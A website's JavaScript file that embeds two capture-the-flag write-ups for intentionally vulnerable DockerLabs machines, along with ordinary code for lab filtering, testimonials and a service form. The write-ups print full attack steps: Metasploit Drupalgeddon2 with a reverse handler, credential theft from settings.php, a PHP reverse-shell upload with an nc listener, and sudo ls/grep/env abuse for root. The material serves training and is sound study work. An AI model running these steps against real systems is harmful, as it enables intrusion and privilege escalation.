// Restless Minds project JavaScript
// Handles navigation, lab filtering, write-up display, form feedback, and localStorage.

const labs = [
    {
        id: "findyourstyle",
        title: "FindYourStyle",
        platform: "DockerLabs",
        difficulty: "Easy",
        os: "Linux",
        tags: ["Linux", "Web", "Drupal", "Metasploit", "Information Leakage", "Sudoers"],
        summary: "DockerLabs machine focused on Drupal enumeration, Metasploit exploitation, credential discovery, lateral movement, and sudo-based privilege escalation.",
        focus: "Drupal enumeration, exposed configuration files, credential reuse, and sudo permissions abuse.",
        sections: [
            {
                heading: "PORT SCANNING",
                blocks: [
                    {
                        type: "p",
                        text: "We start by running a general port scan to identify open ports, followed by a more detailed scan to gather information about the exposed services."
                    },
                    {
                        type: "code",
                        text: "nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.4"
                    },
                    {
                        type: "code",
                        text: "nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.4"
                    },
                    {
                        type: "info",
                        text: `Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-17 15:35 +0100
Nmap scan report for 172.17.0.4
Host is up (0.000044s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-generator: Drupal 8 (https://www.drupal.org)
|_http-title: Welcome to Find your own Style | Find your own Style
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/
| /comment/reply/ /filter/tips/ /node/add/ /search/ /user/register/
| /user/password/ /user/login/ /user/logout/ /index.php/admin/
|_/index.php/comment/reply/
MAC Address: 02:42:AC:11:00:04 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.61 seconds`
                    },
                    {
                        type: "p",
                        text: "The scan shows that port 80 is open and running Apache. The HTTP information also reveals that the web application is using Drupal 8."
                    },
                    {
                        type: "p",
                        text: "Since no exact version is clearly identified from the website itself, we continue by testing known Drupal vulnerabilities in a controlled lab environment."
                    }
                ]
            },
            {
                heading: "METASPLOIT",
                blocks: [
                    {
                        type: "p",
                        text: "We start Metasploit and search for known Drupal vulnerabilities. In this case, we select the Drupalgeddon2 exploit."
                    },
                    {
                        type: "code",
                        text: "msfconsole -q"
                    },
                    {
                        type: "code",
                        text: `msf > use exploit/unix/webapp/drupal_drupalgeddon2
msf > set RHOSTS 172.17.0.4
msf > run`
                    },
                    {
                        type: "info",
                        text: `[*] Started reverse TCP handler on 10.0.4.12:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (41224 bytes) to 172.17.0.4
[*] Meterpreter session 1 opened (10.0.4.12:4444 -> 172.17.0.4:46652) at 2026-02-17 15:40:31 +0100

meterpreter >`
                    },
                    {
                        type: "p",
                        text: "The exploit works successfully and opens a Meterpreter session. From there, we spawn a shell and stabilize it enough to continue enumerating the system."
                    },
                    {
                        type: "code",
                        text: `shell
/bin/bash -i
script /dev/null -c bash`
                    }
                ]
            },
            {
                heading: "LATERAL MOVEMENT",
                blocks: [
                    {
                        type: "p",
                        text: "We begin by enumerating local users that have a shell assigned."
                    },
                    {
                        type: "code",
                        text: "cat /etc/passwd | grep 'sh'"
                    },
                    {
                        type: "info",
                        text: `root:x:0:0:root:/root:/bin/bash
ballenita:x:1000:1000:ballenita,,,:/home/ballenita:/bin/bash`
                    },
                    {
                        type: "p",
                        text: "The system contains a user named ballenita. We continue looking for useful information inside Drupal configuration files."
                    },
                    {
                        type: "p",
                        text: "The settings.php file is a common Drupal configuration file where database credentials may be stored."
                    },
                    {
                        type: "code",
                        text: "cat /var/www/html/sites/default/settings.php"
                    },
                    {
                        type: "info",
                        text: `* The next section describes how to customize the $databases array for more
 * specific needs.
 *
 * @code
 * $databases['default']['default'] = array (
 * 'database' => 'database_under_beta_testing',
 * 'username' => 'ballenita',
 * 'password' => 'ballenitafeliz',
 * 'host' => 'localhost',
 * 'port' => '3306',
 * 'driver' => 'mysql',
 * 'prefix' => '',
 * 'collation' => 'utf8mb4_general_ci',
 * );
 * @endcode
 */
$databases = array();`
                    },
                    {
                        type: "p",
                        text: "The configuration file exposes credentials for the user ballenita with the password ballenitafeliz."
                    },
                    {
                        type: "p",
                        text: "Because password reuse is common in vulnerable environments, we test whether these credentials also work for the local system user."
                    },
                    {
                        type: "code",
                        text: "su ballenita"
                    },
                    {
                        type: "info",
                        text: `ballenita@260dc31a3696:/$ whoami
ballenita
ballenita@260dc31a3696:/$`
                    },
                    {
                        type: "p",
                        text: "The pivot is successful. We now have access as the user ballenita."
                    }
                ]
            },
            {
                heading: "PRIVILEGE ESCALATION",
                blocks: [
                    {
                        type: "p",
                        text: "After gaining access as ballenita, we check sudo permissions."
                    },
                    {
                        type: "code",
                        text: "sudo -l"
                    },
                    {
                        type: "info",
                        text: `Matching Defaults entries for ballenita on 260dc31a3696:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin

User ballenita may run the following commands on 260dc31a3696:
    (root) NOPASSWD: /bin/ls, /bin/grep`
                    },
                    {
                        type: "p",
                        text: "The user can execute /bin/ls and /bin/grep as root without providing a password."
                    },
                    {
                        type: "p",
                        text: "We use the allowed ls binary to list the contents of the /root directory."
                    },
                    {
                        type: "code",
                        text: "sudo -u root /bin/ls -la /root"
                    },
                    {
                        type: "info",
                        text: `total 28
drwx------ 1 root root 4096 Oct 16  2024 .
drwxr-xr-x 1 root root 4096 Feb 17 14:34 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 2 root root 4096 Oct 16  2024 .nano
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root  169 Mar 14  2018 .wget-hsts
-rw-r--r-- 1 root root   35 Oct 16  2024 secretitomaximo.txt`
                    },
                    {
                        type: "p",
                        text: "We identify an interesting file named secretitomaximo.txt. Since grep can also be executed as root, we use it to read the file."
                    },
                    {
                        type: "code",
                        text: "sudo -u root /bin/grep '' /root/secretitomaximo.txt"
                    },
                    {
                        type: "info",
                        text: "nobodycanfindthispasswordrootrocks"
                    },
                    {
                        type: "p",
                        text: "The file reveals what appears to be the root password."
                    },
                    {
                        type: "p",
                        text: "We authenticate as root and confirm access."
                    },
                    {
                        type: "code",
                        text: "su root"
                    },
                    {
                        type: "info",
                        text: `root@260dc31a3696:/# whoami
root
root@260dc31a3696:/#`
                    },
                    {
                        type: "p",
                        text: "We have successfully obtained root access."
                    }
                ]
            }
        ]
    },
    {
        id: "upload",
        title: "Upload",
        platform: "DockerLabs",
        difficulty: "Easy",
        os: "Linux",
        tags: ["Linux", "Web", "PHP", "File Upload", "RCE", "Sudoers"],
        summary: "DockerLabs machine focused on PHP file upload abuse, reverse shell access, TTY treatment, and sudo-based privilege escalation.",
        focus: "File upload exploitation, reverse shell handling, TTY stabilization, and sudo env privilege escalation.",
        sections: [
            {
                heading: "PORT SCANNING",
                blocks: [
                    {
                        type: "p",
                        text: "We start with a general port scan to identify open ports, followed by a more detailed scan against the discovered service."
                    },
                    {
                        type: "code",
                        text: "nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2"
                    },
                    {
                        type: "code",
                        text: "nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.2"
                    },
                    {
                        type: "info",
                        text: `Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 20:42 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000030s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Upload here your file
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.67 seconds`
                    },
                    {
                        type: "p",
                        text: "The only open port is 80. When accessing the web service, we find a panel that allows file uploads."
                    },
                    {
                        type: "p",
                        text: "Uploaded files are stored in the /uploads directory and can be executed from there."
                    }
                ]
            },
            {
                heading: "FILE UPLOAD TO REVERSE SHELL",
                blocks: [
                    {
                        type: "p",
                        text: "We test the upload functionality by uploading a PHP script designed to establish a reverse shell."
                    },
                    {
                        type: "p",
                        text: "After configuring the attacker IP and listener port, the file is saved as shell.php and uploaded through the web panel."
                    },
                    {
                        type: "p",
                        text: "Before executing the uploaded file, we start a listener on the attacking machine."
                    },
                    {
                        type: "code",
                        text: "sudo nc -nlvp 4444"
                    },
                    {
                        type: "p",
                        text: "When the uploaded PHP file is executed, we receive a reverse shell as the www-data user."
                    },
                    {
                        type: "info",
                        text: `connect to [10.0.4.12] from (UNKNOWN) [172.17.0.2] 41646
Linux fe86a383d491 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64 x86_64 x86_64 GNU/Linux
 20:51:08 up  5:19,  0 users,  load average: 0.16, 0.40, 0.73
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$`
                    }
                ]
            },
            {
                heading: "TTY TREATMENT",
                blocks: [
                    {
                        type: "p",
                        text: "Before looking for privilege escalation vectors, we improve the shell to make interaction more stable."
                    },
                    {
                        type: "code",
                        text: `script /dev/null -c bash
ctrl Z`
                    },
                    {
                        type: "code",
                        text: "stty raw -echo; fg"
                    },
                    {
                        type: "code",
                        text: "reset xterm"
                    },
                    {
                        type: "code",
                        text: "export TERM=xterm"
                    },
                    {
                        type: "code",
                        text: "export BASH=bash"
                    }
                ]
            },
            {
                heading: "PRIVILEGE ESCALATION",
                blocks: [
                    {
                        type: "p",
                        text: "We check sudo permissions for the www-data user."
                    },
                    {
                        type: "code",
                        text: "sudo -l"
                    },
                    {
                        type: "info",
                        text: `Matching Defaults entries for www-data on fe86a383d491:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,
    use_pty

User www-data may run the following commands on fe86a383d491:
    (root) NOPASSWD: /usr/bin/env`
                    },
                    {
                        type: "p",
                        text: "The user can run /usr/bin/env as root without a password. This can be abused to spawn a root shell."
                    },
                    {
                        type: "code",
                        text: "sudo env /bin/sh"
                    },
                    {
                        type: "info",
                        text: `# whoami
root
#`
                    },
                    {
                        type: "p",
                        text: "We have successfully obtained root access."
                    }
                ]
            }
        ]
    }
];

const testimonials = [
    {
        name: "Residential Client",
        service: "Gate Remote Control",
        quote: "The remote control was programmed quickly and worked correctly with my residential gate."
    },
    {
        name: "Home Security Client",
        service: "Camera Setup",
        quote: "The camera setup was explained clearly, and now I can monitor my home from my phone."
    },
    {
        name: "Digital Safety Client",
        service: "Cybersecurity Guidance",
        quote: "The recommendations were easy to understand and helped me improve my Wi-Fi and account security."
    }
];

const labReadStorageKey = "restlessMindsReadLabs";
const requestStorageKey = "restlessMindsLastRequest";

let selectedPlatform = "All";
let selectedDifficulty = "All";
let searchTerm = "";

document.addEventListener("DOMContentLoaded", () => {
    setupMobileNavigation();
    markActiveNavigationLink();
    displayFooterDates();
    setupLabsPage();
    displayTestimonials();
    setupServiceForm();
});

function setupMobileNavigation() {
    const menuButton = document.querySelector("#menu-button");
    const navigation = document.querySelector("#primary-navigation");

    if (!menuButton || !navigation) {
        return;
    }

    menuButton.addEventListener("click", () => {
        navigation.classList.toggle("open");
        const isOpen = navigation.classList.contains("open");

        menuButton.setAttribute("aria-expanded", `${isOpen}`);
        menuButton.textContent = isOpen ? `✕` : `☰`;
    });
}

function markActiveNavigationLink() {
    const links = document.querySelectorAll(".primary-navigation a");
    const currentPage = window.location.pathname.split("/").pop() || "index.html";

    links.forEach((link) => {
        const linkPage = link.getAttribute("href");

        if (linkPage === currentPage) {
            link.classList.add("active");
        }
    });
}

function displayFooterDates() {
    const yearElement = document.querySelector("#current-year");
    const modifiedElement = document.querySelector("#last-modified");

    if (yearElement) {
        yearElement.textContent = `${new Date().getFullYear()}`;
    }

    if (modifiedElement) {
        modifiedElement.textContent = `Last Modified: ${document.lastModified}`;
    }
}

function setupLabsPage() {
    const labCards = document.querySelector("#lab-cards");

    if (!labCards) {
        return;
    }

    renderLabFilters();
    renderLabs();
    updateReadCount();

    const searchInput = document.querySelector("#lab-search");
    const resetButton = document.querySelector("#reset-lab-filters");

    searchInput.addEventListener("input", () => {
        searchTerm = searchInput.value.toLowerCase();
        renderLabs();
    });

    resetButton.addEventListener("click", () => {
        selectedPlatform = "All";
        selectedDifficulty = "All";
        searchTerm = "";
        searchInput.value = "";
        closeWriteupReader();
        renderLabFilters();
        renderLabs();
    });
}

function renderLabFilters() {
    const platformContainer = document.querySelector("#platform-filters");
    const difficultyContainer = document.querySelector("#difficulty-filters");

    if (!platformContainer || !difficultyContainer) {
        return;
    }

    const platforms = ["All", "DockerLabs", "TryHackMe", "Hack The Box", "VulNyx"];
    const difficulties = ["All", "Very Easy", "Easy", "Intermediate", "Hard"];

    platformContainer.innerHTML = platforms.map((platform) => {
        const activeClass = platform === selectedPlatform ? `active` : ``;

        return `
            <button class="sidebar-filter-button ${activeClass}" type="button" data-filter-type="platform" data-value="${platform}">
                <span class="filter-dot platform-dot"></span>
                ${platform}
            </button>
        `;
    }).join("");

    difficultyContainer.innerHTML = difficulties.map((difficulty) => {
        const activeClass = difficulty === selectedDifficulty ? `active` : ``;

        return `
            <button class="sidebar-filter-button ${activeClass}" type="button" data-filter-type="difficulty" data-value="${difficulty}">
                <span class="filter-dot ${getDifficultyClass(difficulty)}"></span>
                ${difficulty}
            </button>
        `;
    }).join("");

    const filterButtons = document.querySelectorAll(".sidebar-filter-button");

    filterButtons.forEach((button) => {
        button.addEventListener("click", () => {
            const filterType = button.dataset.filterType;
            const value = button.dataset.value;

            if (filterType === "platform") {
                selectedPlatform = value;
            }

            if (filterType === "difficulty") {
                selectedDifficulty = value;
            }

            closeWriteupReader();
            renderLabFilters();
            renderLabs();
        });
    });
}

function renderLabs() {
    const labCards = document.querySelector("#lab-cards");
    const labCount = document.querySelector("#lab-count");

    if (!labCards || !labCount) {
        return;
    }

    const readLabs = getReadLabs();

    const filteredLabs = labs.filter((lab) => {
        const matchesPlatform = selectedPlatform === "All" || lab.platform === selectedPlatform;
        const matchesDifficulty = selectedDifficulty === "All" || lab.difficulty === selectedDifficulty;
        const searchableText = `${lab.title} ${lab.platform} ${lab.difficulty} ${lab.os} ${lab.tags.join(" ")}`.toLowerCase();
        const matchesSearch = searchableText.includes(searchTerm);

        return matchesPlatform && matchesDifficulty && matchesSearch;
    });

    labCount.textContent = `${filteredLabs.length}`;

    if (filteredLabs.length === 0) {
        labCards.innerHTML = `
            <div class="empty-lab-message">
                <h3>No labs found</h3>
                <p>Try changing the platform, difficulty, or search term.</p>
            </div>
        `;
        return;
    }

    labCards.innerHTML = filteredLabs.map((lab) => {
        const isRead = readLabs.includes(lab.id);
        const readClass = isRead ? `read` : ``;
        const readText = isRead ? `Marked as Read` : `Mark as Read`;

        return `
            <article class="lab-card">
                <div class="lab-card-top">
                    ${getOsIcon(lab.os)}
                    <div>
                        <p class="lab-platform">${lab.platform}</p>
                        <h3>${lab.title}</h3>
                    </div>
                </div>

                <div class="badge-row">
                    <span class="badge ${getDifficultyClass(lab.difficulty)}">${lab.difficulty}</span>
                    <span class="badge">${lab.os}</span>
                </div>

                <p>${lab.summary}</p>

                <div class="tag-list">
                    ${lab.tags.map((tag) => `<span>${tag}</span>`).join("")}
                </div>

                <div class="lab-actions">
                    <button class="small-action-button" type="button" data-action="preview" data-id="${lab.id}">
                        Read Write-Up
                    </button>
                    <button class="small-action-button ${readClass}" type="button" data-action="read" data-id="${lab.id}">
                        ${readText}
                    </button>
                </div>
            </article>
        `;
    }).join("");

    const labButtons = document.querySelectorAll(".lab-actions button");

    labButtons.forEach((button) => {
        button.addEventListener("click", () => {
            const labId = button.dataset.id;
            const action = button.dataset.action;

            if (action === "preview") {
                displayLabDetail(labId);
            }

            if (action === "read") {
                toggleReadLab(labId);
                renderLabs();
                updateReadCount();
            }
        });
    });
}

function displayLabDetail(labId) {
    const detailPanel = document.querySelector("#lab-detail");
    const labsLayout = document.querySelector(".labs-layout");

    if (!detailPanel || !labsLayout) {
        return;
    }

    const selectedLab = labs.find((lab) => lab.id === labId);

    if (!selectedLab) {
        return;
    }

    labsLayout.classList.add("reading-mode");
    detailPanel.classList.add("active");

    detailPanel.innerHTML = `
        <button id="back-to-lab-index" class="small-action-button back-to-index-button" type="button">
            ← Back to Write-Up Index
        </button>

        <div class="writeup-title-row">
            ${getOsIcon(selectedLab.os)}
            <div>
                <p class="eyebrow">${selectedLab.platform} • ${selectedLab.difficulty}</p>
                <h2>${selectedLab.title}</h2>
            </div>
        </div>

        <div class="writeup-meta">
            <p><strong>Platform:</strong> ${selectedLab.platform}</p>
            <p><strong>Operating System:</strong> ${selectedLab.os}</p>
        </div>

        <div class="tag-list">
            ${selectedLab.tags.map((tag) => `<span>${tag}</span>`).join("")}
        </div>

        <p><strong>Learning Focus:</strong> ${selectedLab.focus}</p>

        ${selectedLab.sections.map((section) => {
            return `
                <section class="writeup-section">
                    <h3>${section.heading}</h3>
                    ${section.blocks.map((block) => renderWriteupBlock(block)).join("")}
                </section>
            `;
        }).join("")}
    `;

    const backButton = document.querySelector("#back-to-lab-index");

    backButton.addEventListener("click", () => {
        closeWriteupReader();
        window.scrollTo({
            top: 0,
            behavior: "smooth"
        });
    });

    detailPanel.scrollIntoView({
        behavior: "smooth",
        block: "start"
    });
}

function closeWriteupReader() {
    const detailPanel = document.querySelector("#lab-detail");
    const labsLayout = document.querySelector(".labs-layout");

    if (!detailPanel || !labsLayout) {
        return;
    }

    labsLayout.classList.remove("reading-mode");
    detailPanel.classList.remove("active");
    detailPanel.innerHTML = `
        <p class="eyebrow">Selected Lab</p>
        <h2>Select a lab to read the write-up.</h2>
        <p>
            Choose any lab card to display the full write-up, including port scanning,
            exploitation notes, and privilege escalation steps.
        </p>
    `;
}

function renderWriteupBlock(block) {
    if (block.type === "p") {
        return `<p>${block.text}</p>`;
    }

    if (block.type === "code") {
        return `
            <div class="code-block">
                <div class="code-label">Copy</div>
                <pre><code>${escapeHtml(block.text)}</code></pre>
            </div>
        `;
    }

    if (block.type === "info") {
        return `
            <div class="code-block info-block">
                <div class="code-label">Info</div>
                <pre><code>${escapeHtml(block.text)}</code></pre>
            </div>
        `;
    }

    return "";
}

function getOsIcon(os) {
    // This small badge keeps the OS display simple and easy to maintain.
    const osLabel = os === "Windows" ? "WIN" : "LNX";

    return `
        <span class="lab-os-logo" aria-label="${os}">
            ${osLabel}
        </span>
    `;
}

function getReadLabs() {
    const storedLabs = localStorage.getItem(labReadStorageKey);

    if (!storedLabs) {
        return [];
    }

    try {
        return JSON.parse(storedLabs);
    } catch {
        localStorage.removeItem(labReadStorageKey);
        return [];
    }
}

function toggleReadLab(labId) {
    const readLabs = getReadLabs();
    const isAlreadyRead = readLabs.includes(labId);
    let updatedReadLabs = [];

    if (isAlreadyRead) {
        updatedReadLabs = readLabs.filter((id) => id !== labId);
    } else {
        updatedReadLabs = [...readLabs, labId];
    }

    localStorage.setItem(labReadStorageKey, JSON.stringify(updatedReadLabs));
}

function updateReadCount() {
    const readCount = document.querySelector("#read-count");

    if (!readCount) {
        return;
    }

    readCount.textContent = `${getReadLabs().length}`;
}

function getDifficultyClass(difficulty) {
    if (difficulty === "Very Easy") {
        return "very-easy";
    }

    if (difficulty === "Easy") {
        return "easy";
    }

    if (difficulty === "Intermediate") {
        return "intermediate";
    }

    if (difficulty === "Hard") {
        return "hard";
    }

    return "";
}

function escapeHtml(text) {
    return text
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;");
}

function displayTestimonials() {
    const testimonialContainer = document.querySelector("#testimonial-cards");

    if (!testimonialContainer) {
        return;
    }

    testimonialContainer.innerHTML = testimonials.map((testimonial) => {
        return `
            <article class="testimonial-card">
                <h3>${testimonial.service}</h3>
                <p>"${testimonial.quote}"</p>
                <p><strong>${testimonial.name}</strong></p>
            </article>
        `;
    }).join("");
}

function setupServiceForm() {
    const serviceForm = document.querySelector("#service-form");

    if (!serviceForm) {
        return;
    }

    serviceForm.addEventListener("submit", (event) => {
        event.preventDefault();
        saveServiceRequest();
        serviceForm.reset();
        displayFormFeedback();
    });
}

function saveServiceRequest() {
    const organizationName = document.querySelector("#organization-name").value;
    const contactName = document.querySelector("#contact-name").value;
    const email = document.querySelector("#email").value;
    const phone = document.querySelector("#phone").value;
    const serviceType = document.querySelector("#service-type");
    const budget = document.querySelector("#budget");
    const message = document.querySelector("#message").value;

    const request = {
        organizationName: organizationName,
        contactName: contactName,
        email: email,
        phone: phone,
        serviceType: serviceType.value,
        serviceLabel: serviceType.options[serviceType.selectedIndex].textContent,
        budget: budget.value,
        budgetLabel: budget.options[budget.selectedIndex].textContent,
        message: message,
        submittedAt: new Date().toLocaleString()
    };

    localStorage.setItem(requestStorageKey, JSON.stringify(request));
}

function displayFormFeedback() {
    const feedbackElement = document.querySelector("#form-feedback");

    if (!feedbackElement) {
        return;
    }

    const storedRequest = localStorage.getItem(requestStorageKey);

    if (!storedRequest) {
        feedbackElement.textContent = ``;
        return;
    }

    try {
        const request = JSON.parse(storedRequest);

        feedbackElement.textContent = `Request saved locally for ${request.contactName}.`;

        setTimeout(() => {
            feedbackElement.textContent = ``;
        }, 4000);
    } catch {
        localStorage.removeItem(requestStorageKey);
        feedbackElement.textContent = ``;
    }
}